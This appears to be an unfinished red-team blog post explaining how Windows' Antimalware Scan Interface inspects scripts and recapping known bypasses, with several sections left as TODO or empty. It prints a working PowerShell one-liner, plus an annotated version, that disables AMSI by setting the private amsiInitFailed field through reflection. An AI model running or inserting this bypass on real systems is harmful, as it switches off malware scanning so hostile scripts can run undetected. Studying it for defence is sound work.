---
layout: default
---

_**Apr xx, 2019**_

## Antimalware Scan Interface (AMSI) — A Red Team Analysis on Detection and Evasion

In this post we will analyze how AMSI works and recap existing known bypasses.

## Overview

The Antimalware Scan Interface (AMSI) is a Microsoft Windows protection system built to defend the computer from attacks performed via scripted languages, such as Powershell, VBScript, JavaScript, _et cetera_. [1]
It works by analyzing scripts before the execution, in order to determine if the script is malicious or not.
Moreover, it's designed to detect obfuscated malware by being called recursevely on every evalutation step.
If we think about a typical obfuscated script, they decode and decompress themselves in memory till the final payload is ready to be executed.

## Internals

By being called at every code evaluation points, like `Invoke-Expression`, AMSI can examine both intermediate and final versions of the original, obfuscated script.
In this way, simple techniques to avoid an initial, static screening are not effective anymore.
The function responsible to decide if the script is allowed to run or not is called `AmsiScanBuffer`.
For example, Powershell will call this function every time is about to evaluate any Powershell scripts.
The `AmsiScanBuffer` function comes from `amsi.dll`, loaded in the memory process along all the other userspace libraries.
In fact, `amsi.dll` itself it's a userspace library and this has the consequence of being exposed to a number of attacks.

![AMSI Design](../assets/images/amsi-design.png "AMSI Design")

Check out [Omer Yair's talk](https://www.youtube.com/watch?v=Y3oMEiySxcc) about AMSI and [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell). [6] [7]

## Known Bypasses

All the known bypasses are based on the fact that the AMSI DLL is loaded in the userspace.

### Setting amsiInitFailed to $true

[@mattifestation](https://twitter.com/mattifestation) bypass is so short to fit into a [tweet](https://twitter.com/mattifestation/status/735261176745988096). [3]

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

The `amsi.dll` instance loaded has a private field called `amsiInitFailed`.
It's not directly exposed due to the fact that the field is private, but thanks to the [.NET Reflection API](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection) we can access it.
By setting it at `$true` we can successfully disable AMSI and `amsi.dll`'s `AmsiScanBuffer` won't be called anymore.

```powershell
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') # get `amsi.dll` handle
$field = $amsi.GetField('amsiInitFailed','NonPublic,Static') # get `amsiInitFailed` field
$field.SetValue($null,$true) # set it to `$true`
Write-host -ForegroundColor green "AMSI won't be called anymore"
```

### Patching AmsiScanBuffer

_TODO_

### Hooking .NET Framework

_TODO_

## Weaponization

## Mitigations

- ConstrainedMode for Powershell
- Disable spawning Powershell from Office products

## References

1. [https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal](https://docs.microsoft.com/en-us/windows/desktop/amsi/antimalware-scan-interface-portal)
2. [https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer)
3. [https://twitter.com/mattifestation/status/735261176745988096](https://twitter.com/mattifestation/status/735261176745988096)
4. [https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/)
5. [https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/)
6. [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
7. [https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/)
8. [https://github.com/OmerYa/Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
9. [https://www.youtube.com/watch?v=Y3oMEiySxcc](https://www.youtube.com/watch?v=Y3oMEiySxcc)
10. [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
11. [https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1)
12. [https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)
13. [https://www.youtube.com/watch?v=rEFyalXfQWk](https://www.youtube.com/watch?v=rEFyalXfQWk)
14. [https://github.com/OmerYa/Babel-Shellfish](https://github.com/OmerYa/Babel-Shellfish)

[back](../)
